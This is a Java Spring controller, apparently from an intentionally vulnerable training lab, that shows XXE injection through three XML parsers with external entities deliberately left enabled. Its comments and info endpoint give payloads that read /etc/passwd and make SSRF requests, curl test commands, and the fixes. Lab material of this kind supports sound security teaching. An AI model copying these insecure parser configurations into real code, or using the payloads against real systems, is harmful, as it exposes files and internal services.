package com.vulnlab.controller;

import org.jdom2.Document;
import org.jdom2.input.SAXBuilder;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.web.bind.annotation.*;
import org.xml.sax.InputSource;
import org.xml.sax.XMLReader;
import org.xml.sax.helpers.XMLReaderFactory;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import java.io.StringReader;

/**
 * XXE (XML External Entity) 漏洞演示
 *
 * 漏洞说明：
 * - XML 外部实体注入允许攻击者读取任意文件、执行 SSRF 或发起 DoS 攻击
 * - 影响多种 XML 解析器：XMLReader、SAXBuilder、DocumentBuilder
 *
 * 漏洞原理：
 * 1. XML DTD 允许定义外部实体
 * 2. 恶意实体可引用本地文件：<!ENTITY xxe SYSTEM "file:///etc/passwd">
 * 3. 恶意实体可发起网络请求：<!ENTITY xxe SYSTEM "http://internal.server">
 *
 * 修复方案：
 * 1. 禁用外部实体解析：setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)
 * 2. 禁用外部实体：setFeature("http://xml.org/sax/features/external-general-entities", false)
 * 3. 使用安全的 XML 配置
 *
 * @author VulnLab
 */
@RestController
@RequestMapping("/xxe")
public class XXEController {

    private static final Logger logger = LoggerFactory.getLogger(XXEController.class);

    /**
     * XXE 漏洞 - XMLReader 方式
     *
     * 漏洞原理：XMLReader 未禁用外部实体解析
     *
     * 测试 Payload:
     * <?xml version="1.0" encoding="UTF-8"?>
     * <!DOCTYPE foo [
     *   <!ENTITY xxe SYSTEM "file:///etc/passwd">
     * ]>
     * <root>&xxe;</root>
     *
     * 命令示例:
     * curl -X POST http://localhost:8080/xxe/xmlReader/vuln \
     *   -H "Content-Type: application/xml" \
     *   -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
     *
     * @param xml XML payload
     * @return 解析结果
     */
    @PostMapping("/xmlReader/vuln")
    public String xmlReaderVuln(@RequestBody String xml) {
        logger.info("XXE XMLReader request received");

        try {
            // 漏洞代码：创建 XMLReader 且未禁用外部实体
            XMLReader reader = XMLReaderFactory.createXMLReader();

            // 解析 XML
            reader.parse(new InputSource(new StringReader(xml)));

            // 尝试提取内容（实际攻击中会泄露文件内容）
            return "XML parsed successfully. Content length: " + xml.length();
        } catch (Exception e) {
            logger.error("XMLReader parsing error", e);
            return "XMLReader parsing error: " + e.getMessage();
        }
    }

    /**
     * XXE 漏洞 - SAXBuilder 方式 (JDOM2)
     *
     * 漏洞原理：SAXBuilder 未禁用外部实体解析
     *
     * 测试 Payload:
     * <?xml version="1.0" encoding="UTF-8"?>
     * <!DOCTYPE foo [
     *   <!ENTITY xxe SYSTEM "file:///etc/passwd">
     * ]>
     * <root>&xxe;</root>
     *
     * 命令示例:
     * curl -X POST http://localhost:8080/xxe/saxBuilder/vuln \
     *   -H "Content-Type: application/xml" \
     *   -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
     *
     * @param xml XML payload
     * @return 解析结果
     */
    @PostMapping("/saxBuilder/vuln")
    public String saxBuilderVuln(@RequestBody String xml) {
        logger.info("XXE SAXBuilder request received");

        try {
            // 漏洞代码：创建 SAXBuilder 且未禁用外部实体
            SAXBuilder builder = new SAXBuilder();

            // 解析 XML
            Document doc = builder.build(new StringReader(xml));

            // 返回根元素内容
            String content = doc.getRootElement().getText();
            return "SAXBuilder parsed successfully. Root content: " + content;
        } catch (Exception e) {
            logger.error("SAXBuilder parsing error", e);
            return "SAXBuilder parsing error: " + e.getMessage();
        }
    }

    /**
     * XXE 漏洞 - DocumentBuilder 方式
     *
     * 漏洞原理：DocumentBuilder 未禁用外部实体解析
     *
     * 测试 Payload:
     * <?xml version="1.0" encoding="UTF-8"?>
     * <!DOCTYPE foo [
     *   <!ENTITY xxe SYSTEM "file:///etc/passwd">
     * ]>
     * <root>&xxe;</root>
     *
     * SSRF Payload:
     * <?xml version="1.0" encoding="UTF-8"?>
     * <!DOCTYPE foo [
     *   <!ENTITY xxe SYSTEM "http://127.0.0.1:8080">
     * ]>
     * <root>&xxe;</root>
     *
     * 命令示例:
     * curl -X POST http://localhost:8080/xxe/documentBuilder/vuln \
     *   -H "Content-Type: application/xml" \
     *   -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
     *
     * @param xml XML payload
     * @return 解析结果
     */
    @PostMapping("/documentBuilder/vuln")
    public String documentBuilderVuln(@RequestBody String xml) {
        logger.info("XXE DocumentBuilder request received");

        try {
            // 漏洞代码：创建 DocumentBuilder 且未禁用外部实体
            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
            DocumentBuilder builder = factory.newDocumentBuilder();

            // 解析 XML
            org.w3c.dom.Document doc = builder.parse(new InputSource(new StringReader(xml)));

            // 获取根元素内容
            String content = doc.getDocumentElement().getTextContent();
            return "DocumentBuilder parsed successfully. Root content: " + content;
        } catch (Exception e) {
            logger.error("DocumentBuilder parsing error", e);
            return "DocumentBuilder parsing error: " + e.getMessage();
        }
    }

    /**
     * XXE 信息端点 - 显示漏洞信息
     *
     * @return 漏洞说明
     */
    @GetMapping("/info")
    public String info() {
        StringBuilder info = new StringBuilder();
        info.append("XXE (XML External Entity) 漏洞演示\n");
        info.append("==========================================\n");
        info.append("\n");
        info.append("支持的解析器:\n");
        info.append("1. XMLReader\n");
        info.append("2. SAXBuilder (JDOM2)\n");
        info.append("3. DocumentBuilder\n");
        info.append("\n");
        info.append("攻击向量:\n");
        info.append("- 文件读取: <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n");
        info.append("- SSRF: <!ENTITY xxe SYSTEM \"http://internal.server\">\n");
        info.append("- DoS (Billion Laughs): 递归实体引用\n");
        info.append("\n");
        info.append("测试步骤:\n");
        info.append("1. 构造包含外部实体的 XML payload\n");
        info.append("2. 发送 POST 请求到各漏洞端点\n");
        info.append("3. 观察响应中的文件内容或错误信息\n");
        return info.toString();
    }
}
